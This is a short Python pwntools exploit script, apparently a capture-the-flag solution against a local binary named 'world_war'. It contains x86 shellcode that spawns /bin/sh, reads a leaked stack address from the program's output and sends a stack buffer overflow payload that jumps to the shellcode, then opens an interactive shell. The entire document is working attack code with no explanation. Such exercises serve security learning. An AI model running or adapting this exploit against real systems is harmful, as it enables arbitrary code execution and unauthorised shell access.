shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
from pwn import *

#r = remote("127.0.0.1", 8888)
r = process('world_war')
r.recvuntil("coordinate : ")

buff = r.recvline()
buff = buff[:10]
buff = int(buff, 16)
buff = p32(buff)

payload = shellcode + "a" * (72-len(shellcode)) + buff
r.sendline(payload)
r.interactive()
